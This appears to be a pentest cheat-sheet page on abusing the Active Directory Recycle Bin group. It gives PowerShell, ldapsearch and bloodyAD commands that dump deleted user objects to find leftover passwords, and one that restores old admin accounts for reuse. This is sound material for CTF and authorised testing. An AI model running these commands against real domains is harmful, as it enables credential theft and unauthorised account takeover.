---
icon: recycle
---

# AD Recycle Bin Group

#### Members can enumerate deleted AD objects — sometimes deleted temp users have interesting data (passwords in description, old credentials, etc).

**Requirement:** Member of AD Recycle Bin group / equivalent rights

```powershell
# Windows — Enumerate deleted users
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects

# Get ALL properties of deleted users (look for password/description fields)
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

# Filter for interesting attributes
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties * |
  Select-Object Name, Description, cascadeLegacyPwd, sAMAccountName

# Restore a deleted user
Restore-ADObject -Identity "CN=oldadmin\\0ADEL:GUID,CN=Deleted Objects,DC=corp,DC=local"
```

```bash
# Linux — using ldapsearch (need proper controls)
ldapsearch -x -H ldap://dc-ip -D 'john@corp.local' -w 'Password123' \\
  -b 'CN=Deleted Objects,DC=corp,DC=local' \\
  -E '!1.2.840.113556.1.4.417' \\
  "(isDeleted=TRUE)" sAMAccountName description cascadeLegacyPwd

# bloodyAD
bloodyAD -u john -p Password123 -d corp.local --host dc-ip \\
  get object "CN=Deleted Objects,DC=corp,DC=local" --attr *
```

**What to look for in deleted objects:**

* `cascadeLegacyPwd` — custom attribute sometimes used for legacy password storage (HTB Cascade)
* `description` — admins sometimes put temp passwords in description
* `info` field
* Old admin accounts that can be restored and reused

***
